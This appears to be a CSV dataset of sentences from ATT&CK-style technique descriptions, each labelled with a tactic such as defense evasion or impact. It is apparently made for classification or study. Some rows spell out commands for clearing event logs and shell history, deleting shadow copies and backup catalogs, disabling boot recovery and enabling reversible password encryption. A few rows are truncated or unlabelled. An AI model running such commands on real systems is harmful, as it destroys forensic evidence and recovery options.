"In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples.",DEFENSE_EVASION,,,
"This means that “ ls” will not be saved, but “ls” would be saved by history.",DEFENSE_EVASION,,,
Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.,DEFENSE_EVASION,,,
"On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by default).",DEFENSE_EVASION,,,
Adversaries may change where these logs are saved using Set-PSReadLineOption -HistorySavePath {File Path}.,DEFENSE_EVASION,,,
This will cause ConsoleHost_history.txt to stop receiving logs.,DEFENSE_EVASION,,,
"Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing.",DEFENSE_EVASION,,,
Adversaries may also leverage a [Network Device CLI] on network devices to disable historical command logging.,DEFENSE_EVASION,,,
An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed.,DEFENSE_EVASION,,,
This could include maliciously redirecting .,DEFENSE_EVASION,,,
"ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell] Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations.",DEFENSE_EVASION,,,
"In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis.",DEFENSE_EVASION,,,
"This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.",DEFENSE_EVASION,,,
Adversaries may abuse Windows safe mode to disable endpoint defenses.,DEFENSE_EVASION,,,
Safe mode starts up the Windows operating system with a limited set of drivers and services.,DEFENSE_EVASION,,,
Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode.,DEFENSE_EVASION,,,
There are two versions of safe mode: Safe Mode and Safe Mode with Networking.,DEFENSE_EVASION,,,
It is possible to start additional services after a safe mode boot.,DEFENSE_EVASION,,,
Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot.,DEFENSE_EVASION,,,
"Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.",DEFENSE_EVASION,,,
Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry]).,DEFENSE_EVASION,,,
Malicious [Component Object Model] (COM) objects may also be registered and loaded in safe mode.,DEFENSE_EVASION,,,
Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment.,PERSISTENCE,,,
"Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored.",PERSISTENCE,,,
"Unlike [Upload Malware], this technique focuses on adversaries implanting an image in a registry within a victim’s environment.",PERSISTENCE,,,
"Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.",PERSISTENCE,,,
A tool has been developed to facilitate planting backdoors in cloud container images.,PERSISTENCE,,,
Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions.,DEFENSE_EVASION,,,
"Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders.",DEFENSE_EVASION,,,
"Location, format, and type of artifact (such as command or login history) are often specific to each platform.",DEFENSE_EVASION,,,
"Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity.",DEFENSE_EVASION,,,
This may compromise the integrity of security solutions by causing notable events to go unreported.,DEFENSE_EVASION,,,
"This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",DEFENSE_EVASION,,,
"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion.",DEFENSE_EVASION,,,
"On Linux and macOS, these command histories can be accessed in a few different ways.",DEFENSE_EVASION,,,
"While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE.",DEFENSE_EVASION,,,
The benefit of this is that it allows users to go back to commands they've used before in different sessions.,DEFENSE_EVASION,,,
Adversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history file rm ~/.bash_history.,DEFENSE_EVASION,,,
Adversaries may also leverage a [Network Device CLI] on network devices to clear command history data.,DEFENSE_EVASION,,,
"On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module.",DEFENSE_EVASION,,,
The built-in history only tracks the commands used in the current session.,DEFENSE_EVASION,,,
This command history is not available to other sessions and is deleted when the session ends.,DEFENSE_EVASION,,,
The PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by default).,DEFENSE_EVASION,,,
This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.,DEFENSE_EVASION,,,
Adversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session.,DEFENSE_EVASION,,,
"This, however, will not delete/flush the ConsoleHost_history.txt file.",DEFENSE_EVASION,,,
Adversaries may also delete the ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.,DEFENSE_EVASION,,,
Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs.,DEFENSE_EVASION,,,
The majority of native system logging is stored under the /var/log/ directory.,DEFENSE_EVASION,,,
"Subfolders in this directory categorize logs by their related functions, such as:



* /var/log/messages:: General and system-related messages

* /var/log/secure or /var/log/auth.log: Authentication logs

* /var/log/utmp or /var/log/wtmp: Login records

* /var/log/kern.log: Kernel logs

* /var/log/cron.log: Crond logs

* /var/log/maillog: Mail server logs

* /var/log/httpd/: Web server access and error logs.",DEFENSE_EVASION,,,
Adversaries may clear Windows Event Logs to hide the activity of an intrusion.,DEFENSE_EVASION,,,
Windows Event Logs are a record of a computer's alerts and notifications.,DEFENSE_EVASION,,,
"There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.",DEFENSE_EVASION,,,
"The event logs can be cleared with the following utility commands:



* wevtutil cl system

* wevtutil cl application

* wevtutil cl security.",DEFENSE_EVASION,,,
"These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell].",DEFENSE_EVASION,,,
Adversaries may delete files left behind by the actions of their intrusion activity.,DEFENSE_EVASION,,,
"Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer]) may leave traces to indicate to what was done within a network and how.",DEFENSE_EVASION,,,
"Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.",DEFENSE_EVASION,,,
"There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. functions include del on Windows and rm or unlink on Linux and macOS.",DEFENSE_EVASION,,,
Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation.,DEFENSE_EVASION,,,
Windows shared drive and [SMB/Windows Admin Shares] connections can be removed when no longer needed. [Net] is an example utility that can be used to remove network share connections with the net use \\system\share /delete command.,DEFENSE_EVASION,,,
Adversaries may modify file time attributes to hide new or changes to existing files.,DEFENSE_EVASION,,,
"Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder.",DEFENSE_EVASION,,,
"This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.",DEFENSE_EVASION,,,
Timestomping may be used along with file name [Masquerading] to hide malware and tools.,DEFENSE_EVASION,,,
"Various Windows utilities may be used to execute commands, possibly without invoking [cmd].",DEFENSE_EVASION,,,
"For example, [Forfiles], the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter], Run window, or via scripts.",DEFENSE_EVASION,,,
"Adversaries may abuse these features for [Defense Evasion], specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd] or file extensions more commonly associated with malicious payloads.",DEFENSE_EVASION,,,
Adversaries may transfer tools or other files from an external system into a compromised environment.,COMMAND_AND_CONTROL,,,
Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp].,COMMAND_AND_CONTROL,,,
"Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]).",COMMAND_AND_CONTROL,,,
Files can also be transferred using various [Web Service]s as well as native or otherwise present tools on the victim system.,COMMAND_AND_CONTROL,,,
"On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell] commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest.",COMMAND_AND_CONTROL,,,
"On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.",COMMAND_AND_CONTROL,,,
This may deny access to available backups and recovery options.,IMPACT,,,
"Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features.",IMPACT,,,
Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction] and [Data Encrypted for Impact].,IMPACT,,,
"A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:



* vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet

* [Windows Management Instrumentation] can be used to delete volume shadow copies - wmic shadowcopy delete

* wbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet

* bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no.",IMPACT,,,
"During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes.",COLLECTION,CREDENTIAL_ACCESS,,
Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking]) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture]).,COLLECTION,CREDENTIAL_ACCESS,,
Adversaries may hook into Windows application programming interface (API) functions to collect user credentials.,COLLECTION,CREDENTIAL_ACCESS,,
"Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials., this technique focuses specifically on API functions that include parameters that reveal user credentials.",COLLECTION,CREDENTIAL_ACCESS,,
"Hooking involves redirecting calls to these functions and can be implemented via:



* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.

* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.

* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",COLLECTION,CREDENTIAL_ACCESS,,
Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt.,COLLECTION,CREDENTIAL_ACCESS,,
"When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control]).",COLLECTION,CREDENTIAL_ACCESS,,
"Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.",COLLECTION,CREDENTIAL_ACCESS,,
Adversaries may log user keystrokes to intercept credentials as the user types them.,COLLECTION,CREDENTIAL_ACCESS,,
"Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping] efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.",COLLECTION,CREDENTIAL_ACCESS,,
"Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.",COLLECTION,CREDENTIAL_ACCESS,,
"Some methods include:



* Hooking API callbacks used for processing keystrokes.",COLLECTION,CREDENTIAL_ACCESS,,
"Unlike [Credential API Hooking], this focuses solely on API functions intended for processing keystroke data.

* Reading raw keystroke data from the hardware buffer.

* Windows Registry modifications.

* Custom drivers.

"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service.",COLLECTION,CREDENTIAL_ACCESS,,
"For example, a compromised login page may log provided user credentials before logging the user in to the service.",COLLECTION,CREDENTIAL_ACCESS,,
This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services] and [Valid Accounts] or as part of the initial compromise by exploitation of the externally facing web service.,COLLECTION,CREDENTIAL_ACCESS,,
"IPC is typically used by processes to share data, communicate with each other, or synchronize execution.",EXECUTION,,,
"IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern.",EXECUTION,,,
Adversaries may abuse IPC to execute arbitrary code or commands.,EXECUTION,,,
"IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange] or [Component Object Model].",EXECUTION,,,
"Linux environments support several different IPC mechanisms, two of which being sockets and pipes.",EXECUTION,,,
Adversaries may use the Windows Component Object Model (COM) for local code execution.,EXECUTION,,,
"COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.",EXECUTION,,,
"Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic].",EXECUTION,,,
Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands.,EXECUTION,,,
DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications.,EXECUTION,,,
"Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.",EXECUTION,,,

"Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing] campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.",EXECUTION,,,
DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter].,EXECUTION,,,
DDE execution can be invoked remotely via [Remote Services] such as [Distributed Component Object Model] (DCOM).,EXECUTION,,,
"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools.",EXECUTION,,,
"Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service C API or the high level NSXPCConnection API in order to handle tasks that require elevated privileges (such as network connections).",EXECUTION,,,
Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services.,EXECUTION,,,
Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.,EXECUTION,,,
Adversaries can abuse XPC services to execute malicious content.,EXECUTION,,,
Requests for malicious execution can be passed through the application's XPC Services handler..,EXECUTION,,,
Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user.,LATERAL_MOVEMENT,,,
Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.,LATERAL_MOVEMENT,,,
Adversaries may leverage [Spearphishing Attachment] or [Spearphishing Link] as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture] on sites that mimic email login interfaces.,LATERAL_MOVEMENT,,,
There have been notable incidents where internal spearphishing has been used.,LATERAL_MOVEMENT,,,
"The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.",LATERAL_MOVEMENT,,,
Adversaries may transfer tools or other files between systems in a compromised environment.,LATERAL_MOVEMENT,,,
Once brought into the victim environment (i.e. [Ingress Tool Transfer]) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.,LATERAL_MOVEMENT,,,
Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares] to connected network shares or with authenticated connections via [Remote Desktop Protocol].,LATERAL_MOVEMENT,,,
"Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp].",LATERAL_MOVEMENT,,,
"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.",DEFENSE_EVASION,,,
"This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.",DEFENSE_EVASION,,,
Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading].,DEFENSE_EVASION,,,
Adversaries may abuse a double extension in the filename as a means of masquerading the true file type.,DEFENSE_EVASION,,,
A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: File.txt.exe may render in some views as just File.txt).,DEFENSE_EVASION,,,
"However, the second extension is the true file type that determines how the file is opened and executed.",DEFENSE_EVASION,,,
"The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.",DEFENSE_EVASION,,,
Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads.,DEFENSE_EVASION,,,
A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code.,DEFENSE_EVASION,,,
Such files often pose as email attachments and allow an adversary to gain [Initial Access] into a user’s system via [Spearphishing Attachment] then [User Execution].,DEFENSE_EVASION,,,
"For example, an executable file attachment named Evil.txt.exe may display as Evil.txt to a user.",DEFENSE_EVASION,,,
"The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.",DEFENSE_EVASION,,,
"Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign.",DEFENSE_EVASION,,,
"Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",DEFENSE_EVASION,,,
"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool.",DEFENSE_EVASION,,,
Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.,DEFENSE_EVASION,,,
"Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program.",DEFENSE_EVASION,,,
"Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.",DEFENSE_EVASION,,,
"Unlike [Code Signing], this activity will not result in a valid signature.",DEFENSE_EVASION,,,
Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign.,DEFENSE_EVASION,,,
Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.,DEFENSE_EVASION,,,
Windows services will have a service name as well as a display name.,DEFENSE_EVASION,,,
Many benign tasks and services exist that have commonly associated names.,DEFENSE_EVASION,,,
Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.,DEFENSE_EVASION,,,
"Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",DEFENSE_EVASION,,,
Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them.,DEFENSE_EVASION,,,
This is done for the sake of evading defenses and observation.,DEFENSE_EVASION,,,
"This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe).",DEFENSE_EVASION,,,
"In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster.",DEFENSE_EVASION,,,
"Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.",DEFENSE_EVASION,,,
Adversaries may also use the same icon of the file they are trying to mimic.,DEFENSE_EVASION,,,
Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities.,DEFENSE_EVASION,,,
Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.,DEFENSE_EVASION,,,
Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign.,DEFENSE_EVASION,,,
RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse.,DEFENSE_EVASION,,,
"For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx.",DEFENSE_EVASION,,,
A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png.,DEFENSE_EVASION,,,
Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type.,DEFENSE_EVASION,,,
A common use of this technique is with [Spearphishing Attachment]/[Malicious File] since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character.,DEFENSE_EVASION,,,
Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.,DEFENSE_EVASION,,,
"RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",DEFENSE_EVASION,,,
Adversaries can hide a program's true filetype by changing the extension of a file.,DEFENSE_EVASION,,,
"With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.",DEFENSE_EVASION,,,
"For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute.",DEFENSE_EVASION,,,
"If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary).",DEFENSE_EVASION,,,
"However, if the file is renamed to evil.txt (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed .",DEFENSE_EVASION,,,
Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.,DEFENSE_EVASION,,,
Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts].",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key]).,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller).",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"Adversaries may use [Patch System Image] to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.



[Modify System Image] may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
The modification includes a specific password which is implanted in the operating system image via the patch.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"Upon authentication attempts, the inserted code will first check to see if the user input is the password.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"If so, access is granted.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Windows password filters are password policy enforcement mechanisms for both domain and local accounts.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Filters are implemented as DLLs containing a method to validate potential passwords against password policies.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Any potential changes cannot take effect until every registered filter acknowledges validation.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"To perform proper validation, filters must receive plain-text credentials from the LSA.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
A malicious password filter would receive these plain-text credentials every time a password request is made.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Adversaries may modify components of the PAM system to create backdoors.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
Malicious modifications to the PAM system may also be abused to steal credentials.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.,CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"To decrypt the passwords, an adversary needs four components:

1. Encrypted password (G$RADIUSCHAP) from the Active Directory user-structure userParameters
2. 16 byte randomly-generated value (G$RADIUSCHAPKEY) also from userParameters
3. Global LSA secret (G$MSRADIUSCHAPKEY)
4. Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL).",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell] module.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to ""Windows Server 2008"" or higher.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"In PowerShell, an adversary may make associated changes to user settings using commands similar to Set-ADUser -AllowReversiblePasswordEncryption $true.",CREDENTIAL_ACCESS,DEFENSE_EVASION,,
"A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.",DEFENSE_EVASION,,,
Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure.,DEFENSE_EVASION,,,
Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.,DEFENSE_EVASION,,,
An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses.,DEFENSE_EVASION,,,
Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account.,DEFENSE_EVASION,,,
"An adversary may [Create Snapshot] of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System] or for [Remote Data Staging].",DEFENSE_EVASION,,,
Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.,DEFENSE_EVASION,,,
An adversary may create a snapshot or data backup within a cloud account to evade defenses.,DEFENSE_EVASION,,,
"A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume.",DEFENSE_EVASION,,,
"An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance] where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.",DEFENSE_EVASION,,,
"An adversary may [Create Cloud Instance], mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.",DEFENSE_EVASION,,,
An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.,DEFENSE_EVASION,,,
Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.,DEFENSE_EVASION,,,
An adversary may also [Create Cloud Instance] and later terminate the instance after achieving their objectives.,DEFENSE_EVASION,,,
An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence.,DEFENSE_EVASION,,,
"In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.",DEFENSE_EVASION,,,
Another variation of this technique is to utilize temporary storage attached to the compute instance.,DEFENSE_EVASION,,,
"Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.",DEFENSE_EVASION,,,
"Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access.",DEFENSE_EVASION,,,
The built-in Windows command-line utility [Reg] may be used for local or remote Registry modification.,DEFENSE_EVASION,,,
"Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.",DEFENSE_EVASION,,,
